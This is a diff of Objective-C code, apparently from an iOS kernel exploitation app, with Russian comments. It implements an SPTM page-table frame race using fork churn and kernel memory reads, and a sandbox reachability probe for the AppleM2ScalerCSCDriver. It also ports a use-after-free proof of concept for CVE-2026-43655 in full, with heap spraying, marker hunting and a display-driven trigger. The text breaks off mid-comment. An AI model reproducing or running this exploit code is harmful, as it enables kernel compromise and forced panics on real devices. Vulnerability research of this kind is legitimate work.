+                kpNote(r, [NSString stringWithFormat:@"  twig T=%llu VA=%#llx: grand walk не дал twig PA (ret=0x%016llx errno=%d) — дальше",
+                          (unsigned long long)t, (unsigned long long)va, (unsigned long long)gpa, errno]);
+            }
+            continue;
+        }
+        // cross-check via the subordinate pmap's own tree (L1 stop = twig PA)
+        errno = 0;
+        uint64_t slvl = PMAP_TT_L1_LEVEL;
+        uint64_t spa = vtophys_lvl(subTtep, va, &slvl, NULL);
+        BOOL match = (spa == gpa);
+        kpNote(r, [NSString stringWithFormat:@"  twig T=%llu VA=%#llx: grand L2 ref PA=0x%010llx (tte@0x%016llx) · subord walk ret=0x%016llx (errno=%d)%@",
+                  (unsigned long long)t, (unsigned long long)va,
+                  (unsigned long long)gpa, (unsigned long long)gTteAddr,
+                  (unsigned long long)spa, errno,
+                  match ? @"  (совпал — здоровый nested)" : (spa ? @"  ← НЕ СОВПАЛ" : @"  ← subord не транслируется")]);
+        if (match) {
+            chosenT = (int64_t)t; twigPA = gpa; twigVA = va; twigMatchesSubord = YES;
+            break;
+        }
+        if (chosenT < 0) {
+            chosenT = (int64_t)t; twigPA = gpa; twigVA = va;
+        }
+    }
+    if (misses > (uint64_t)loggedMisses) {
+        kpNote(r, [NSString stringWithFormat:@"  …ещё %llu twig'ов без grand-резолва (пропущено в логе)",
+                  (unsigned long long)(misses - (uint64_t)loggedMisses)]);
+    }
+    if (chosenT < 0) {
+        [r appendString:@"FAIL: ни один twig не резолвится даже через grand pmap — см. debug-walk выше (обрыв виден по raw TTE)\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  выбран twig T=%lld VA=0x%016llx PA=0x%010llx%@",
+              (long long)chosenT, (unsigned long long)twigVA, (unsigned long long)twigPA,
+              twigMatchesSubord ? @"" : @"  (ВНИМАНИЕ: grand/subordinate не совпали на baseline — twig PA взят по grand walk)"]);
+    if (kconstant(physBase) && kconstant(physSize)) {
+        BOOL inDRAM = twigPA >= kconstant(physBase) && twigPA < kconstant(physBase) + kconstant(physSize);
+        kpNote(r, [NSString stringWithFormat:@"  twigPA в managed DRAM [%#llx..%#llx): %s",
+                  (unsigned long long)kconstant(physBase),
+                  (unsigned long long)(kconstant(physBase) + kconstant(physSize)),
+                  inDRAM ? "да" : "НЕТ — FTE может лежать за пределами frame table"]);
+    }
+
+    // 4. Frame table + baseline FTE of the twig frame.
+    //    fte = table + (pa>>14)*16; +0 rw_guard:u16 · +2 type:u8 · +4 level:u8 · +8 owner:u64
+    uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+    if (!tableVA) {
+        [r appendString:@"FAIL: frame table недоступна (ни gFrameTableVA, ни libsptm_frame_table)\n"];
+        return r;
+    }
+    uint64_t fteVA = tableVA + ((twigPA - kconstant(physBase)) >> 14) * 16;
+    kpNote(r, [NSString stringWithFormat:@"  FTE twig'а @ 0x%016llx (pfn от physBase=0x%llx)", fteVA, (unsigned long long)((twigPA - kconstant(physBase)) >> 14)]);
+    [r appendString:@"  справка типов: 0x0b(11)=XNU_DEFAULT(heap) · 0x14(20)=leaf · CPU page-table={0x08(8),0x11(17),0x12(18),0x1f(31)} · rw_guard≥2 пока nested жив\n"];
+
+    // 1.9.9: the first FTE read came back as garbage (level=112, owner=u64
+    // junk) — so dump the frame table head before trusting the indexing, plus
+    // the alternative (pa-physBase)>>14 indexing; the field run decides which.
+    {
+        uint8_t headRaw[128];
+        memset(headRaw, 0, sizeof(headRaw));
+        if (kpRead(tableVA, headRaw, sizeof(headRaw), "frame table head", r)) {
+            kpNote(r, @"  frame table head (128 байт):");
+            kpAppendHexDump(r, tableVA, headRaw, sizeof(headRaw));
+        }
+        // alternate indexing: pfn relative to physBase
+        uint64_t altFteVA = tableVA + ((twigPA - kconstant(physBase)) >> 14) * 16;
+        uint8_t altRaw[16];
+        memset(altRaw, 0, sizeof(altRaw));
+        if (kpRead(altFteVA, altRaw, sizeof(altRaw), "twig FTE (pfn от physBase)", r)) {
+            kpNote(r, [NSString stringWithFormat:@"  alt-index FTE @ %#llx: %02x %02x %02x %02x | %02x %02x …",
+                      (unsigned long long)altFteVA, altRaw[0], altRaw[1], altRaw[2], altRaw[3], altRaw[4], altRaw[5]]);
+        }
+    }
+
+    uint8_t baseRaw[16];
+    if (!kpRead(fteVA, baseRaw, sizeof(baseRaw), "twig FTE baseline", r)) return r;
+    struct kpExp13FTE base;
+    kpExp13ParseFTE(baseRaw, &base);
+    kpNote(r, [NSString stringWithFormat:@"  baseline: rw_guard=0x%04x type=0x%02x level=%u owner=0x%02x",
+              (unsigned)base.rwGuard, (unsigned)base.type, (unsigned)base.level, (unsigned)base.owner]);
+    if (base.type == 0x0b) {
+        kpNote(r, @"  ВНИМАНИЕ: baseline type уже 0x0b (XNU_DEFAULT) на живом twig — либо twig простаивает, либо это и есть окно; гонка покажет дельту");
+    }
+    if (base.rwGuard < 2) {
+        kpNote(r, @"  ВНИМАНИЕ: baseline rw_guard < 2 при живом nested — уже аномально");
+    }
+
+    // 5. Probe fork once on the rig thread: if the sandbox blocks fork(), the
+    //    churn is impossible — learn that before spawning threads.
+    errno = 0;
+    pid_t probe = fork();
+    if (probe == 0) _exit(0);
+    if (probe > 0) {
+        int st = 0;
+        waitpid(probe, &st, 0);
+        kpNote(r, @"  probe fork OK — churn возможен");
+    }
+    else {
+        [r appendFormat:@"SKIP: fork() запрещён (%s) — nest/unnest churn из приложения недоступен, гонка не состоялась\n",
+            strerror(errno)];
+        return r;
+    }
+
+    // 6. Race: 4 churn threads + FTE poll every ~30 ms, ≤30 s or first anomaly.
+    struct kpExp13ChurnCtx ctx = { 0, 0, 0, 0 };
+    pthread_t th[KP_EXP13_CHURN_THREADS];
+    BOOL created[KP_EXP13_CHURN_THREADS] = { NO };
+    int started = 0;
+    for (int i = 0; i < KP_EXP13_CHURN_THREADS; i++) {
+        int pr = pthread_create(&th[i], NULL, kpExp13ChurnMain, &ctx);
+        if (pr == 0) {
+            created[i] = YES;
+            started++;
+        }
+        else {
+            kpNote(r, [NSString stringWithFormat:@"  pthread_create #%d failed: %s", i, strerror(pr)]);
+        }
+    }
+    if (!started) {
+        [r appendString:@"FAIL: ни одного churn-потока не запустилось\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  churn: %d потока(ов) fork/waitpid запущено; опрос FTE каждые ~30 мс, до 30 с или первой аномалии", started]);
+
+    const useconds_t pollUs = 30000;
+    const double maxS = 30.0;
+    BOOL anomaly = NO, desyncWin = NO;
+    uint64_t polls = 0;
+    NSDate *t0 = [NSDate date];
+    while (-[t0 timeIntervalSinceNow] < maxS && !anomaly && ctx.forkBroken < started) {
+        usleep(pollUs);
+        uint8_t cur[16];
+        memset(cur, 0, sizeof(cur));
+        // quiet raw read: the kpRead gates were already passed at baseline,
+        // and a logged read every 30 ms would flood the live log
+        kreadbuf(fteVA, cur, sizeof(cur));
+        polls++;
+        struct kpExp13FTE now;
+        kpExp13ParseFTE(cur, &now);
+        if (now.rwGuard != base.rwGuard || now.type != base.type ||
+            now.level != base.level || now.owner != base.owner) {
+            anomaly = YES;
+            // sync-logged BEFORE anything else: a panic on the next line must
+            // not eat the delta
+            kpNote(r, [NSString stringWithFormat:@"EXP-13 DESYNC @ +%.0f мс (poll #%llu): rw_guard 0x%04x→0x%04x · type 0x%02x→0x%02x · level %u→%u · owner 0x%02x→0x%02x",
+                      -[t0 timeIntervalSinceNow] * 1000.0, (unsigned long long)polls,
+                      (unsigned)base.rwGuard, (unsigned)now.rwGuard,
+                      (unsigned)base.type, (unsigned)now.type,
+                      (unsigned)base.level, (unsigned)now.level,
+                      (unsigned)base.owner, (unsigned)now.owner]);
+            errno = 0;
+            uint64_t glvl = PMAP_TT_L2_LEVEL;
+            uint64_t gpa = vtophys_lvl(ttep, twigVA, &glvl, NULL);
+            if (gpa) {
+                kpNote(r, [NSString stringWithFormat:@"  grand twig-TTE ЖИВ: L2 ref PA=0x%010llx (errno=%d)%@",
+                          (unsigned long long)gpa, errno,
+                          gpa == twigPA ? @" — ссылается на наш twig" : @" — УКАЗЫВАЕТ НА ДРУГОЙ PA!"]);
+            }
+            else {
+                kpNote(r, [NSString stringWithFormat:@"  grand twig-TTE НЕВАЛИДЕН (errno=%d) — unnest в полёте?", errno]);
+            }
+            if (now.type == 0x0b && gpa == twigPA) desyncWin = YES;
+        }
+    }
+    double elapsed = -[t0 timeIntervalSinceNow];
+
+    // 7. Teardown: stop flag, join, final logged read.
+    ctx.stop = 1;
+    for (int i = 0; i < KP_EXP13_CHURN_THREADS; i++) {
+        if (created[i]) pthread_join(th[i], NULL);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  стоп: прошло %.1f с · форков≈%llu · опросов=%llu%s",
+              elapsed, (unsigned long long)ctx.forks, (unsigned long long)polls,
+              ctx.forkBroken ? " (churn-потоки умирали на fork()!)" : ""]);
+    if (ctx.forkBroken) {
+        kpNote(r, [NSString stringWithFormat:@"  fork() отваливался с errno=%d (%s) — churn был ослаблен",
+                  ctx.forkErrno, strerror(ctx.forkErrno)]);
+    }
+
+    uint8_t postRaw[16];
+    if (kpRead(fteVA, postRaw, sizeof(postRaw), "twig FTE post-race", r)) {
+        struct kpExp13FTE post;
+        kpExp13ParseFTE(postRaw, &post);
+        kpNote(r, [NSString stringWithFormat:@"  post-race: rw_guard=0x%04x type=0x%02x level=%u owner=0x%02x",
+                  (unsigned)post.rwGuard, (unsigned)post.type, (unsigned)post.level, (unsigned)post.owner]);
+    }
+
+    if (desyncWin) {
+        [r appendString:@"\n=== EXP-13 HIT: FTE.type стал 0x0b (XNU_DEFAULT) при ЖИВОМ twig-TTE ===\n"];
+        [r appendString:@"Page-table фрейм выглядит как обычная heap-страница → physwrite окно на живую таблицу страниц. Это кандидат C (SPTM logic break).\n"];
+    }
+    else if (anomaly) {
+        [r appendString:@"\n=== EXP-13: аномалия зафиксирована (детали выше), но критического type-flip не было ===\n"];
+        [r appendString:@"Дрейф rw_guard/level/owner — след гонки nest/unnest. Подкрутить twig T, длительность или число потоков и повторить.\n"];
+    }
+    else {
+        [r appendFormat:@"\n=== EXP-13: десинка нет за %.1f с (форков≈%llu, опросов=%llu) ===\n",
+            elapsed, (unsigned long long)ctx.forks, (unsigned long long)polls];
+        [r appendString:@"FTE twig'а держался стабильно под churn'ом. Следующие шаги: больше потоков, другой twig T, или churn через GPU/ANE shared address spaces (E5).\n"];
+    }
+    return r;
+}
+
+// M2Scaler reachability probe. Pure userland IOKit: no KRW, no kernel
+// pointers. The only question it answers: can our sandboxed app open a user
+// client on AppleM2ScalerCSCDriver? If yes, the M2Scaler bugs
+// (CVE-2025-43510 / CVE-2026-43655) are directly weaponizable from here.
++ (NSString *)m2ScalerReachabilityReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== M2Scaler reachability probe (IOKit, app sandbox) ===");
+    kpNote(r, @"Цель: AppleM2ScalerCSCDriver · CVE-2025-43510 / CVE-2026-43655");
+
+    BOOL anyListed = NO;
+    BOOL anyOpened = NO;
+
+    // 1. Single-shot lookup — the same call a real exploit would use first.
+    errno = 0;
+    io_service_t single = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                      IOServiceMatching("AppleM2ScalerCSCDriver"));
+    kpNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingService: %@ (service=0x%x, errno=%d %s)",
+               single ? @"OK — сервис найден" : @"пусто",
+               single, errno, errno ? strerror(errno) : "-"]);
+    if (single) {
+        anyListed = YES;
+        IOObjectRelease(single);
+    }
+
+    // 2. Full enumeration + per-service open attempts (type 0 and type 1).
+    errno = 0;
+    io_iterator_t iter = IO_OBJECT_NULL;
+    kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
+                                                    IOServiceMatching("AppleM2ScalerCSCDriver"),
+                                                    &iter);
+    if (kr != KERN_SUCCESS) {
+        kpNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingServices: FAIL kr=0x%x (%s), errno=%d %s",
+                   kr, mach_error_string(kr), errno, errno ? strerror(errno) : "-"]);
+    }
+    else {
+        unsigned idx = 0;
+        io_service_t service;
+        while ((service = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
+            anyListed = YES;
+            char name[128] = {0};
+            kern_return_t nkr = IORegistryEntryGetName(service, name);
+            uint64_t regID = 0;
+            IORegistryEntryGetRegistryEntryID(service, &regID);
+            kpNote(r, [NSString stringWithFormat:@"  сервис #%u: name=%s registryID=0x%llx (getName kr=0x%x)",
+                       idx, nkr == KERN_SUCCESS ? name : "?",
+                       (unsigned long long)regID, nkr]);
+
+            for (uint32_t type = 0; type <= 1; type++) {
+                errno = 0;
+                io_connect_t conn = IO_OBJECT_NULL;
+                kern_return_t okr = IOServiceOpen(service, mach_task_self(), type, &conn);
+                kpNote(r, [NSString stringWithFormat:@"    IOServiceOpen(type=%u): %s kr=0x%x (%s)%s%d%s%s",
+                           type, okr == KERN_SUCCESS ? "OK" : "FAIL",
+                           okr, mach_error_string(okr),
+                           errno ? ", errno=" : "", errno,
+                           errno ? " " : "", errno ? strerror(errno) : ""]);
+                if (okr == KERN_SUCCESS) {
+                    anyOpened = YES;
+                    IOServiceClose(conn);
+                }
+            }
+            IOObjectRelease(service);
+            idx++;
+        }
+        IOObjectRelease(iter);
+        if (idx == 0) {
+            kpNote(r, @"  IOServiceGetMatchingServices: OK, но итератор пуст (0 сервисов)");
+        }
+    }
+
+    // 3. Verdict.
+    [r appendString:@"\n"];
+    if (anyOpened) {
+        [r appendString:@"=== M2SCALER REACHABLE: драйвер открывается из app sandbox ===\n"];
+        [r appendString:@"IOServiceOpen на AppleM2ScalerCSCDriver прошёл — CVE-2025-43510/43655 в нашем распоряжении. Следующий шаг: IOConnectCall* фаззинг селекторов по write-up'ам багов.\n"];
+    }
+    else if (anyListed) {
+        [r appendString:@"=== M2SCALER LISTED, NOT OPENABLE: сервис виден, но open закрыт sandbox'ом ===\n"];
+        [r appendString:@"IORegistry lookup проходит, IOServiceOpen отклонён (sandbox deny iokit-user-client-class). Из нашего процесса CVE-2025-43510/43655 недосягаемы — нужен процесс с более широким sandbox profile или unsandbox (E11).\n"];
+    }
+    else {
+        [r appendString:@"=== M2SCALER NOT LISTED: драйвер не найден в IORegistry из sandbox ===\n"];
+        [r appendString:@"Либо sandbox режет даже lookup, либо драйвер не поднят на этом железе/версии. Повторить после unsandbox (E11), чтобы отличить одно от другого.\n"];
+    }
+    return r;
+}
+
+
+// ---------- Программный compositor/scaler trigger для M2Scaler UAF ----------
+// В оригинальном PoC scheduler дёргался ручным тапом по Dynamic Island. Здесь
+// вместо этого на каждом кадре переписываем пиксели нашей IOSurface и
+// переназначаем её как contents видимого CALayer (32x32 → 64x64, linear):
+// compositor/display pipe обязан заново прочитать и отмасштабировать
+// поверхность через M2Scaler pipeline каждый кадр, пока идут UAF-раунды.
+// Весь UI — строго на main thread (start/stop диспатчит вызывающий).
+
+
+// Размеры структур ровно по ScalerTeardownUAF.m (CVE-2026-43655 PoC):
+// TSD 0x1B0: +0x000 srcID u32, +0x004 dstID u32, +0x008 async u64.
+// Credit (selector 10): struct 0x18, +0x000 marker u32.
+#define KP_M2_TSD_SIZE 0x1B0
+
++ (NSString *)m2ScalerUafReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== M2Scaler teardown UAF (CVE-2026-43655) ===");
+    kpNote(r, @"!!! ДЕСТРУКТИВНО: МОЖЕТ ПАНИКОВАТЬ — паника и есть подтверждение бага !!!");
+    kpNote(r, @"Каждая строка ниже sync-записана в kexproof-live.log ДО возможной паники (переживёт ребут как kexproof-prev.log).");
+    kpNote(r, @"Сценарий (точно по ScalerTeardownUAF.m):");
+    kpNote(r, @"  1) open victim (type 0), 2 IOSurface 32x32 BGRA, sync baseline (sel 1, TSD 0x1B0)");
+    kpNote(r, @"  2) credit=0xDEAD0001 (sel 10, struct 0x18), 50 async-опов (sel 1, TSD+0x008=1)");
+    kpNote(r, @"  3) IOServiceClose(victim) — per_client+ops освобождаются, записи scheduler'а висят");
+    kpNote(r, @"  4) спрей 50 коннекшенов, credit=0xBEEF0002 у каждого");
+    kpNote(r, @"  5) 100 раундов × 50 async-опов на спрее + программный compositor trigger");
+    kpNote(r, @"Чтение паник-лога: x9=0xBEEF0002 → UAF CONFIRMED (freed slot занят спреем);");
+    kpNote(r, @"  x9=0xDEAD0001 → stale entry victim'а; иное → память переиспользована системой.");
+
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingService: пусто (errno=%d %s) — драйвер не виден из sandbox",
+                   errno, errno ? strerror(errno) : "-"]);
+        [r appendString:@"\n=== M2UAF SKIP: сервис не найден — прогон невозможен ===\n"];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  сервис AppleM2ScalerCSCDriver: 0x%x", svc]);
+
+    // ---------------- STEP 1: victim + sync baseline ----------------
+    kpNote(r, @"--- STEP 1: victim-коннекшен + sync baseline ---");
+    io_connect_t victim = IO_OBJECT_NULL;
+    IOReturn kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen(type 0): conn=0x%x kr=0x%x (%s)",
+               victim, kr, mach_error_string(kr)]);
+    if (kr != KERN_SUCCESS || victim == IO_OBJECT_NULL) {
+        kpNote(r, @"  open отклонён — sandbox profile изменился? (на 18.6 type 0/1 давали kr=0)");
+        IOObjectRelease(svc);
+        [r appendString:@"\n=== M2UAF SKIP: IOServiceOpen не прошёл — прогон невозможен ===\n"];
+        return r;
+    }
+
+    // KRW instrumentation: resolve the connection's kernel object (the
+    // IOSurfaceAcceleratorClient C++ object) through our own ipc table, and
+    // dump it at every step. This shows whether async ops actually land in
+    // the client/scheduler state, whether close poisons it, and whether the
+    // spray reoccupies the freed slot — instead of flying blind.
+    __block uint64_t m2Table = 0;  // our is_table VA
+    BOOL krwOK = (gPrimitives.kreadbuf != NULL);
+    if (krwOK) {
+        uint64_t selfProcM = [self findProcByCommName:getprogname() log:r];
+        if (!selfProcM) selfProcM = [self findProcByCommName:"KexProofV2" log:r];
+        uint64_t prM = 0, tkM = 0, spM = 0, tbM = 0;
+        if (selfProcM &&
+            kpRead(selfProcM + koffsetof(proc, proc_ro), &prM, 8, "m2 proc_ro", r) &&
+            kpRead(kp_untag_ptr(prM) + off_proc_ro_pr_task, &tkM, 8, "m2 task", r) &&
+            kpRead(kp_untag_ptr(tkM) + off_task_itk_space, &spM, 8, "m2 itk_space", r) &&
+            kpRead(kp_untag_ptr(spM) + off_ipc_space_is_table, &tbM, 8, "m2 is_table", r)) {
+            m2Table = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                      ? kp_untag_ptr(kpSMRDecode(tbM)) : kp_untag_ptr(tbM);
+        }
+        kpNote(r, [NSString stringWithFormat:@"  KRW-инструментарий: is_table=%#llx %@", (unsigned long long)m2Table,
+                  m2Table ? @"(дампы клиента будут)" : @"(не удалось — идём вслепую)"]);
+    }
+    void (^dumpClient)(io_connect_t, NSString *) = ^(io_connect_t conn, NSString *tag) {
+        if (!m2Table || conn == IO_OBJECT_NULL) return;
+        uint64_t eVA = m2Table + (uint64_t)sizeof_ipc_entry * (conn >> 8);
+        uint64_t oRaw = 0, kRaw = 0;
+        if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "m2 ie_object", r)) return;
+        uint64_t pVA = kp_untag_ptr(oRaw);
+        if (!kpLooksLikeKernelPointer(pVA)) return;
+        if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "m2 ip_kobject", r)) return;
+        uint64_t cVA = kp_untag_ptr(kRaw);
+        if (!kpLooksLikeKernelPointer(cVA)) { kpNote(r, [NSString stringWithFormat:@"    %@: kobj не kernel VA (%#llx)", tag, (unsigned long long)kRaw]); return; }
+        uint8_t cb[0x200];
+        memset(cb, 0, sizeof(cb));
+        if (!kpRead(cVA, cb, sizeof(cb), "m2 client dump", r)) return;
+        kpNote(r, [NSString stringWithFormat:@"    %@: userClient @ %#llx (первые 0x200):", tag, (unsigned long long)cVA]);
+        for (uint32_t o = 0; o + 8 <= sizeof(cb); o += 8) {
+            uint64_t q = 0;
+            memcpy(&q, cb + o, 8);
+            if (q) kpNote(r, [NSString stringWithFormat:@"      +0x%03x: %#018llx", o, (unsigned long long)q]);
+        }
+    };
+    void (^markerHunt)(uint32_t, NSString *) = ^(uint32_t marker, NSString *tag) {
+        if (!m2Table) return;
+        uint64_t tableVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        if (!tableVA2) { kpNote(r, @"  markerHunt: frame table недоступна — пропуск"); return; }
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        int hits = 0, pages21 = 0;
+        for (uint64_t pg = 0; pg < totalPages && hits < 8; pg++) {
+            uint8_t ent[16];
+            kreadbuf(tableVA2 + pg * 16, ent, 16);
+            if (ent[2] != 0x21) continue;
+            pages21++;
+            uint64_t pa = kconstant(physBase) + pg * 0x4000;
+            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+            if (!kva) continue;
+            uint8_t buf[0x4000];
+            if (!kpRead(kva, buf, sizeof(buf), "m2 heap scan", r)) continue;
+            for (uint32_t o = 0; o + 4 <= sizeof(buf); o += 4) {
+                uint32_t v = 0;
+                memcpy(&v, buf + o, 4);
+                if (v == marker) {
+                    kpNote(r, [NSString stringWithFormat:@"    %@: маркер %#x @ kva=%#llx (PA=%#llx, +%#x)",
+                              tag, marker, (unsigned long long)(kva + o), (unsigned long long)pa, o]);
+                    hits++;
+                    break;
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  %@: скан heap (0x21) — %d страниц, маркер %#x найден %d раз",
+                  tag, pages21, marker, hits]);
+    };
+
+    NSDictionary *sp = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
+                         (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    if (!srcS || !dstS) {
+        kpNote(r, @"  IOSurfaceCreate вернул NULL — выход (драйвер не тронут)");
+        if (srcS) CFRelease(srcS);
+        if (dstS) CFRelease(dstS);
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        [r appendString:@"\n=== M2UAF SKIP: IOSurface не создались ===\n"];
+        return r;
+    }
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    uint32_t dstID = IOSurfaceGetID(dstS);
+    // По PoC поверхности не освобождаются: async-опы ссылаются на них по ID,
+    // а srcS дополнительно крутит compositor trigger (см. STEP 5).
+    kpNote(r, [NSString stringWithFormat:@"  IOSurface 32x32 BGRA: srcID=%u dstID=%u (не освобождаем — так в PoC)", srcID, dstID]);
+
+    uint8_t baseline[KP_M2_TSD_SIZE];
+    memset(baseline, 0, KP_M2_TSD_SIZE);
+    *(uint32_t *)(baseline + 0x000) = srcID;   // +0x000 srcID u32
+    *(uint32_t *)(baseline + 0x004) = dstID;   // +0x004 dstID u32
+
+    kr = IOConnectCallMethod(victim, 1, NULL, 0, baseline, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    kpNote(r, [NSString stringWithFormat:@"  sync baseline (sel 1, TSD 0x1B0): kr=0x%x (%s)", kr, mach_error_string(kr)]);
+    dumpClient(victim, @"после open+sync baseline");
+
+    // ---------------- STEP 2: credit + 50 async-опов ----------------
+    kpNote(r, @"--- STEP 2: credit=0xDEAD0001 + 50 async-опов ---");
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, 0x18);
+        *(uint32_t *)s10 = 0xDEAD0001;  // credit struct +0x000 marker u32
+        uint64_t sc[3] = {0, 0, 0};
+        kr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kpNote(r, [NSString stringWithFormat:@"  sel 10 credit=0xDEAD0001 (struct 0x18): kr=0x%x (%s)", kr, mach_error_string(kr)]);
+    }
+    int asyncOK = 0;
+    for (int i = 0; i < 50; i++) {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, baseline, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;  // +0x008 async u64 — async path
+        kr = IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+        if (kr == KERN_SUCCESS) asyncOK++;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  async-опы victim: %d/50 OK — 50 записей с credit=0xDEAD0001 в куче scheduler'а", asyncOK]);
+    dumpClient(victim, @"после 50 async-опов (копится ли состояние?)");
+    markerHunt(0xDEAD0001, @"после credit+async");
+
+    // ---------------- STEP 3: teardown ----------------
+    kpNote(r, @"--- STEP 3: IOServiceClose(victim) — точка невозврата ---");
+    kpNote(r, @"  освобождаются per_client (0x170 байт) + operation objects;");
+    kpNote(r, @"  если scheduler heap держит записи — dangling pointers.");
+    kr = IOServiceClose(victim);
+    kpNote(r, [NSString stringWithFormat:@"  IOServiceClose: kr=0x%x — victim освобождён", kr]);
+    dumpClient(victim, @"после close (poison/free pattern?)");
+
+    // ---------------- STEP 4: спрей ----------------
+    kpNote(r, @"--- STEP 4: спрей 50 коннекшенов (credit=0xBEEF0002) ---");
+    io_connect_t spray[50];
+    int sprayOK = 0;
+    for (int i = 0; i < 50; i++) {
+        spray[i] = IO_OBJECT_NULL;
+        kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
+        if (skr == KERN_SUCCESS && spray[i] != IO_OBJECT_NULL) {
+            sprayOK++;
+            uint8_t s10[0x18];
+            memset(s10, 0, 0x18);
+            *(uint32_t *)s10 = 0xBEEF0002;
+            uint64_t sc[3] = {0, 0, 0};
+            IOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  спрей: %d/50 открыто, credit=0xBEEF0002 (per_client+0x158)", sprayOK]);
+    kpNote(r, @"  спрей-коннекшены НЕ закрываем — держим freed slot занятым (по PoC)");
+    markerHunt(0xBEEF0002, @"после спрея");
+    markerHunt(0xDEAD0001, @"висит ли victim-маркер после close");
+    dumpClient(victim, @"слот victim после спрея (кто-то занял?)");
+    if (sprayOK > 0) dumpClient(spray[0], @"spray[0] клиент (сравнение layout)");
+
+    // ---------------- STEP 5: триггер scheduler ----------------
+    kpNote(r, @"--- STEP 5: триггер scheduler (100 раундов × 50 async-опов + compositor trigger) ---");
+    // Программная замена «tap Dynamic Island» из оригинального PoC: видимый
+    // CALayer с contents = наша IOSurface + CADisplayLink, который каждый кадр
+    // переписывает пиксели и переназначает contents. Compositor/display pipe
+    // обязан каждый кадр читать и масштабировать поверхность через M2Scaler —
+    // scheduler крутится без участия пользователя. UI только на main thread.
+    KPM2ScalerTrigger *trig = [KPM2ScalerTrigger new];
+    __block BOOL trigStarted = NO;
+    dispatch_sync(dispatch_get_main_queue(), ^{
+        [trig startWithSurface:srcS];
+        trigStarted = (trig.link != nil);
+    });
+    kpNote(r, trigStarted
+        ? @"  compositor trigger запущен (CADisplayLink, IOSurface на экране 64x64, linear scale)"
+        : @"  compositor trigger НЕ запустился (нет активного окна) — идём только на async-опах");
+    for (int round = 0; round < 100; round++) {
+        for (int i = 0; i < sprayOK && i < 50; i++) {
+            if (spray[i] != IO_OBJECT_NULL) {
+                uint8_t tsd[KP_M2_TSD_SIZE];
+                memcpy(tsd, baseline, KP_M2_TSD_SIZE);
+                *(uint64_t *)(tsd + 0x008) = 1;
+                IOConnectCallMethod(spray[i], 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            }
+        }
+        if (round % 10 == 0)
+            kpNote(r, [NSString stringWithFormat:@"  раунд %d/100 — живы (паника возможна в любой момент)", round]);
+        usleep(100000);
+    }
+
+    kpNote(r, @"--- 100 раундов завершены, паники не было ---");
+    dispatch_sync(dispatch_get_main_queue(), ^{
+        [trig stop];
+    });
+    kpNote(r, @"  compositor trigger остановлен");
+    IOObjectRelease(svc);
+    [r appendString:@"\n=== M2UAF: дожили до конца без паники — баг не сработал в этом прогоне, повторить ===\n"];
+    [r appendString:@"Compositor trigger гнал scaler все 100 раундов. Если паники не было — записи scheduler'а в этом прогоне чистятся корректно; повторить (гонка вероятностная). Паника ПОСЛЕ возврата отчёта тоже считается — весь ход уже в kexproof-live.log на диске.\n"];
+    return r;
+}
+
+#pragma mark - M2Scaler teardown UAF, calibration-first (CVE-2026-43655)
+
+// M2T: вариант teardown-UAF с калибровкой оффсетов на живом железе.
+// Отличия от m2ScalerUafReport (тот — чистый PoC-порт):
+//   (1) фаза A ПЕРЕД гонкой: kread-дамп живого IOSurfaceAcceleratorClient
+//       (18.6: размер 0x168, op-структура M2ScalerCSCRequest 0x21c0 — оффсеты
+//       отличаются от 26.4-билда оригинального PoC) и цепочка scheduler;
+//   (2) оффсет credit калибруется чтением после sel 10 (статика 18.6 из
+//       bug-hunt: sel 10 пишет [client+0x148], submit sel 1 читает [UC+0x148]
+//       — подтверждено дизасмом 0x9258b80/0x9259678; PoC 26.4 имел +0x158);
+//   (3) параллельный submitter-тред на ВТОРОМ коннекшене гонит scheduler ВО
